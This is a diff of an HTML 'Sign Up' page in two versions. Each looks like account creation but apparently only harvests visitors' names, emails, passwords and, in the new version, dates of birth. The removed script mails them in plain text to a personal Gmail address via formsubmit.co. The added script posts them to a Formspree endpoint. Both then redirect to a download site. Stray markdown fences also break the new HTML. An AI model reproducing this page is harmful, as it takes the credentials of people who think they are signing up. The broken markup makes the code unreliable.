@@ -1,192 +1,393 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Premium Sign Up</title>
-    <style>
-        /* Dark Theme with Gold Accents */
-        body { 
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            background-color: #050505; 
-            margin: 0; 
-            color: #ffffff; 
-        }
-        .container { 
-            background: #121212; 
-            padding: 40px 30px; 
-            border-radius: 15px; 
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5), 0 0 10px rgba(212, 175, 55, 0.1); 
-            text-align: center; 
-            width: 85%;
-            max-width: 380px; 
-            border: 1px solid #d4af37; 
-        }
-        h2 { 
-            color: #d4af37; 
-            margin-bottom: 10px;
-            font-size: 28px;
-        }
-        p {
-            font-size: 14px;
-            color: #888;
-            margin-bottom: 25px;
-        }
-        .input-group {
-            text-align: left;
-            margin-bottom: 15px;
-        }
-        label {
-            display: block;
-            font-size: 12px;
-            color: #d4af37;
-            margin-bottom: 5px;
-            margin-left: 5px;
-            text-transform: uppercase;
-        }
-        input { 
-            width: 100%; 
-            padding: 12px; 
-            box-sizing: border-box;
-            border: 1px solid #333; 
-            border-radius: 8px; 
-            background: #1e1e1e; 
-            color: white; 
-            font-size: 16px;
-            transition: 0.3s;
-        }
-        input:focus {
-            outline: none;
-            border-color: #d4af37;
-            background: #252525;
-        }
-        button { 
-            padding: 15px; 
-            background: linear-gradient(135deg, #d4af37, #b8860b); 
-            color: #000; 
-            border: none; 
-            border-radius: 8px; 
-            cursor: pointer; 
-            font-size: 17px;
-            font-weight: bold;
-            width: 100%;
-            margin-top: 15px;
-            transition: 0.3s;
-            box-shadow: 0 4px 15px rgba(212, 175, 55, 0.3);
-        }
-        button:active {
-            transform: scale(0.98);
-        }
-        #loading-screen { 
-            display: none; 
-            text-align: center;
-        }
-        .spinner {
-            border: 4px solid rgba(212, 175, 55, 0.1);
-            width: 36px;
-            height: 36px;
-            border-radius: 50%;
-            border-left-color: #d4af37;
-            animation: spin 1s linear infinite;
-            margin: 0 auto 10px;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign Up</title>
+  <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+```
+:root {
+  --bg: #0b0c10;
+  --card: #13141a;
+  --border: #222430;
+  --accent: #c8f135;
+  --accent2: #7fff6e;
+  --text: #f0f0f0;
+  --muted: #6b6f7e;
+  --input-bg: #1a1b24;
+  --error: #ff5f5f;
+}
+
+body {
+  min-height: 100vh;
+  background: var(--bg);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-family: 'DM Sans', sans-serif;
+  color: var(--text);
+  overflow: hidden;
+}
+
+/* Background blobs */
+body::before, body::after {
+  content: '';
+  position: fixed;
+  border-radius: 50%;
+  filter: blur(120px);
+  z-index: 0;
+  pointer-events: none;
+}
+body::before {
+  width: 500px; height: 500px;
+  background: radial-gradient(circle, #c8f13520 0%, transparent 70%);
+  top: -150px; right: -100px;
+}
+body::after {
+  width: 400px; height: 400px;
+  background: radial-gradient(circle, #7fff6e18 0%, transparent 70%);
+  bottom: -120px; left: -80px;
+}
+
+.card {
+  position: relative;
+  z-index: 1;
+  background: var(--card);
+  border: 1px solid var(--border);
+  border-radius: 24px;
+  padding: 48px 44px;
+  width: 100%;
+  max-width: 440px;
+  box-shadow: 0 0 60px #c8f13510, 0 30px 80px #00000060;
+  animation: slideUp 0.6s cubic-bezier(0.16, 1, 0.3, 1) both;
+}
+
+@keyframes slideUp {
+  from { opacity: 0; transform: translateY(30px); }
+  to   { opacity: 1; transform: translateY(0); }
+}
+
+.logo-dot {
+  width: 10px; height: 10px;
+  background: var(--accent);
+  border-radius: 50%;
+  display: inline-block;
+  margin-right: 8px;
+  box-shadow: 0 0 10px var(--accent);
+}
+
+.brand {
+  font-family: 'Syne', sans-serif;
+  font-size: 13px;
+  font-weight: 600;
+  letter-spacing: 0.15em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 32px;
+  display: flex;
+  align-items: center;
+}
+
+h1 {
+  font-family: 'Syne', sans-serif;
+  font-size: 32px;
+  font-weight: 800;
+  line-height: 1.1;
+  margin-bottom: 6px;
+  letter-spacing: -0.5px;
+}
+
+h1 span {
+  color: var(--accent);
+}
+
+.subtitle {
+  font-size: 14px;
+  color: var(--muted);
+  margin-bottom: 36px;
+  font-weight: 300;
+}
+
+.field {
+  margin-bottom: 18px;
+}
+
+label {
+  display: block;
+  font-size: 12px;
+  font-weight: 500;
+  letter-spacing: 0.08em;
+  text-transform: uppercase;
+  color: var(--muted);
+  margin-bottom: 8px;
+}
+
+input {
+  width: 100%;
+  background: var(--input-bg);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 14px 16px;
+  font-size: 15px;
+  font-family: 'DM Sans', sans-serif;
+  color: var(--text);
+  outline: none;
+  transition: border-color 0.2s, box-shadow 0.2s;
+  -webkit-appearance: none;
+}
+
+input:focus {
+  border-color: var(--accent);
+  box-shadow: 0 0 0 3px #c8f13518;
+}
+
+input::placeholder { color: #3d3f4e; }
+
+input[type="date"]::-webkit-calendar-picker-indicator {
+  filter: invert(0.4);
+  cursor: pointer;
+}
+
+.pass-wrap {
+  position: relative;
+}
+.pass-wrap input { padding-right: 44px; }
+.eye-btn {
+  position: absolute;
+  right: 14px;
+  top: 50%;
+  transform: translateY(-50%);
+  background: none;
+  border: none;
+  cursor: pointer;
+  color: var(--muted);
+  font-size: 18px;
+  line-height: 1;
+  padding: 0;
+  transition: color 0.2s;
+}
+.eye-btn:hover { color: var(--accent); }
+
+.btn {
+  width: 100%;
+  margin-top: 28px;
+  padding: 16px;
+  background: var(--accent);
+  color: #0b0c10;
+  border: none;
+  border-radius: 12px;
+  font-size: 15px;
+  font-family: 'Syne', sans-serif;
+  font-weight: 700;
+  letter-spacing: 0.05em;
+  cursor: pointer;
+  transition: transform 0.15s, box-shadow 0.15s, background 0.15s;
+  position: relative;
+  overflow: hidden;
+}
+
+.btn:hover {
+  background: var(--accent2);
+  box-shadow: 0 8px 30px #c8f13540;
+  transform: translateY(-1px);
+}
+
+.btn:active { transform: translateY(0); }
+
+.btn.loading {
+  pointer-events: none;
+  opacity: 0.7;
+}
+
+.btn .spinner {
+  display: none;
+  width: 18px; height: 18px;
+  border: 2px solid #0b0c1060;
+  border-top-color: #0b0c10;
+  border-radius: 50%;
+  animation: spin 0.7s linear infinite;
+  margin: 0 auto;
+}
+
+.btn.loading .btn-text { display: none; }
+.btn.loading .spinner { display: block; }
+
+@keyframes spin { to { transform: rotate(360deg); } }
+
+.success-msg {
+  display: none;
+  text-align: center;
+  padding: 20px;
+  background: #c8f13512;
+  border: 1px solid #c8f13530;
+  border-radius: 12px;
+  margin-top: 20px;
+  font-size: 14px;
+  color: var(--accent);
+  animation: fadeIn 0.4s ease;
+}
+
+@keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+
+.err-msg {
+  font-size: 11px;
+  color: var(--error);
+  margin-top: 5px;
+  display: none;
+}
+
+.divider {
+  height: 1px;
+  background: var(--border);
+  margin: 28px 0 0;
+}
+
+@media (max-width: 480px) {
+  .card { padding: 36px 24px; margin: 16px; border-radius: 20px; }
+  h1 { font-size: 26px; }
+}
+```
+
+  </style>
 </head>
 <body>
 
-    <!-- Loading Screen jab user redirect ho raha ho -->
-    <div id="loading-screen">
-        <div class="spinner"></div>
-        <p style="color: #d4af37;">Please wait...</p>
-    </div>
+<div class="card">
+  <div class="brand"><span class="logo-dot"></span>Create Account</div>
+  <h1>Join Us <span>Today.</span></h1>
+  <p class="subtitle">Fill in your details to get started</p>
 
-    <!-- Main Signup Form -->
-    <div class="container" id="signup-box">
-        <h2>Sign Up</h2>
-        <p>Apni details enter karke continue karein</p>
-        
-        <div class="input-group">
-            <label>Pura Naam</label>
-            <input type="text" id="userName" placeholder="Maslan: Ali Ahmed" required />
-        </div>
+  <form id="signupForm">
+    <!-- Hidden field: Formspree redirect -->
+    <input type="hidden" name="_next" value="https://allinonedown.weebly.com"/>
+    <input type="hidden" name="_subject" value="New Sign Up Submission"/>
 
-        <div class="input-group">
-            <label>Email Address</label>
-            <input type="email" id="userEmail" placeholder="name@example.com" required />
-        </div>
+```
+<div class="field">
+  <label for="name">Full Name</label>
+  <input type="text" id="name" name="name" placeholder="Enter your full name" required/>
+  <div class="err-msg" id="nameErr">Please enter your name</div>
+</div>
 
-        <div class="input-group">
-            <label>Password</label>
-            <input type="password" id="userPass" placeholder="••••••••" required />
-        </div>
-        
-        <button id="submitBtn" onclick="handleSignup()">Create Account</button>
-    </div>
+<div class="field">
+  <label for="email">Email Address</label>
+  <input type="email" id="email" name="email" placeholder="you@example.com" required/>
+  <div class="err-msg" id="emailErr">Please enter a valid email</div>
+</div>
 
-    <script>
-        // --- SETTINGS ---
-        const adminEmail = "mrpinto1433@gmail.com"; 
-        const targetLink = "https://allinonedown.weebly.com"; 
+<div class="field">
+  <label for="dob">Date of Birth</label>
+  <input type="date" id="dob" name="date_of_birth" required/>
+  <div class="err-msg" id="dobErr">Please select your date of birth</div>
+</div>
 
-        // Page load hote hi check karein
-        window.onload = function() {
-            if (localStorage.getItem("app_user_verified") === "true") {
-                showLoading();
-                window.location.href = targetLink;
-            }
-        };
+<div class="field">
+  <label for="password">Password</label>
+  <div class="pass-wrap">
+    <input type="password" id="password" name="password" placeholder="Create a password" required/>
+    <button type="button" class="eye-btn" onclick="togglePass()" id="eyeBtn">👁</button>
+  </div>
+  <div class="err-msg" id="passErr">Password must be at least 6 characters</div>
+</div>
 
-        function showLoading() {
-            document.getElementById("signup-box").style.display = "none";
-            document.getElementById("loading-screen").style.display = "block";
-        }
+<button type="submit" class="btn" id="submitBtn">
+  <span class="btn-text">Sign Up →</span>
+  <div class="spinner"></div>
+</button>
+```
 
-        function handleSignup() {
-            const name = document.getElementById("userName").value;
-            const email = document.getElementById("userEmail").value;
-            const pass = document.getElementById("userPass").value;
-            const btn = document.getElementById("submitBtn");
+  </form>
 
-            if(!name || !email || !pass) {
-                alert("Tamam khali jaghen pur karein!");
-                return;
-            }
+  <div class="success-msg" id="successMsg">
+    ✅ Account created! Redirecting you now...
+  </div>
 
-            btn.innerText = "Processing...";
-            btn.disabled = true;
+  <div class="divider"></div>
+</div>
 
-            // Details ko aapke email par bhejna
-            fetch(`https://formsubmit.co/ajax/${adminEmail}`, {
-                method: "POST",
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    "Naya User": name,
-                    "Email": email,
-                    "Password": pass,
-                    "_subject": "App Se Naya Signup!"
-                })
-            })
-            .then(() => {
-                // Device mein save karlo ke signup ho gaya
-                localStorage.setItem("app_user_verified", "true");
-                showLoading();
-                // Link par bhej do
-                window.location.href = targetLink;
-            })
-            .catch(() => {
-                alert("Connection error! Dobara koshish karein.");
-                btn.innerText = "Create Account";
-                btn.disabled = false;
-            });
-        }
-    </script>
+<script>
+  function togglePass() {
+    const p = document.getElementById('password');
+    const btn = document.getElementById('eyeBtn');
+    if (p.type === 'password') {
+      p.type = 'text';
+      btn.textContent = '🙈';
+    } else {
+      p.type = 'password';
+      btn.textContent = '👁';
+    }
+  }
+
+  document.getElementById('signupForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+
+    // Clear errors
+    document.querySelectorAll('.err-msg').forEach(el => el.style.display = 'none');
+
+    const name = document.getElementById('name').value.trim();
+    const email = document.getElementById('email').value.trim();
+    const dob = document.getElementById('dob').value;
+    const password = document.getElementById('password').value;
+
+    let valid = true;
+
+    if (!name) {
+      document.getElementById('nameErr').style.display = 'block';
+      valid = false;
+    }
+    if (!email || !/\S+@\S+\.\S+/.test(email)) {
+      document.getElementById('emailErr').style.display = 'block';
+      valid = false;
+    }
+    if (!dob) {
+      document.getElementById('dobErr').style.display = 'block';
+      valid = false;
+    }
+    if (password.length < 6) {
+      document.getElementById('passErr').style.display = 'block';
+      valid = false;
+    }
+
+    if (!valid) return;
+
+    const btn = document.getElementById('submitBtn');
+    btn.classList.add('loading');
+
+    const formData = new FormData();
+    formData.append('name', name);
+    formData.append('email', email);
+    formData.append('date_of_birth', dob);
+    formData.append('password', password);
+    formData.append('_next', 'https://allinonedown.weebly.com');
+    formData.append('_subject', 'New Sign Up Submission');
+
+    try {
+      const res = await fetch('https://formspree.io/f/mpqbdbor', {
+        method: 'POST',
+        body: formData,
+        headers: { 'Accept': 'application/json' }
+      });
+
+      if (res.ok) {
+        document.getElementById('successMsg').style.display = 'block';
+        document.getElementById('signupForm').style.display = 'none';
+        setTimeout(() => {
+          window.location.href = 'https://allinonedown.weebly.com';
+        }, 1500);
+      } else {
+        alert('Something went wrong. Please try again.');
+        btn.classList.remove('loading');
+      }
+    } catch (err) {
+      alert('Network error. Please check your connection.');
+      btn.classList.remove('loading');
+    }
+  });
+</script>
+
 </body>
 </html>
